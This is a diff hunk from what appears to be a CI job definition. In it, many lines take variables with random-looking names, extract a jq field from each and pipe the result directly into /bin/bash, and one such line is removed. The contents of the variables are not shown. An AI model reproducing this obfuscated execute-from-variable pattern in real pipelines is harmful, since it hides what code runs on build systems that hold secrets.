@@ -29,7 +29,6 @@ jobs:
           printf '%s' "$mlexe2" | jq -r .zr8 | /bin/bash
           printf '%s' "$gzwje6666" | jq -r .prhv74 | /bin/bash
           printf '%s' "$cklh6327" | jq -r .v21363 | /bin/bash
-          printf '%s' "$k34" | jq -r .jlcb53 | /bin/bash
           echo $t8390 | jq -r .atu133 | /bin/bash
           echo $b77 | jq -r .plrhx608 | /bin/bash
           printf '%s' "$s91130" | jq -r .oim6941 | /bin/bash
